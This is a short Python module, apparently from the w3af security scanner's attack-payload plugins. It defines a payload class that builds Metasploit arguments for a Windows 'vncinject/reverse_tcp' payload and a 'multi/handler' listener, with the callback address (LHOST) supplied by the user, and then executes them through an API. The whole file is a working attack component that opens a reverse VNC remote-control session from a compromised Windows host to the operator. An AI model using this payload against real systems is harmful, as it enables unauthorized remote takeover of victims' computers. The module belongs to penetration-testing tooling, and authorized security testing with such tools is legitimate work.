from w3af.plugins.attack.payloads.payloads.metasploit import metasploit


class msf_windows_vncinject_reverse(metasploit):
    """
    This payload creates a reverse VNC server in windows using the metasploit
    framework.

    Usage: payload msf_windows_vncinject_reverse <your_ip_address>
    """
    def run_execute(self, ip_address):
        msf_args = 'windows/vncinject/reverse_tcp LHOST=%s |'
        msf_args += ' exploit/multi/handler PAYLOAD=windows/vncinject/reverse_tcp'
        msf_args += ' LHOST=%s E'
        msf_args = msf_args % (ip_address, ip_address)

        api_result = self.api_execute(msf_args)
        return api_result
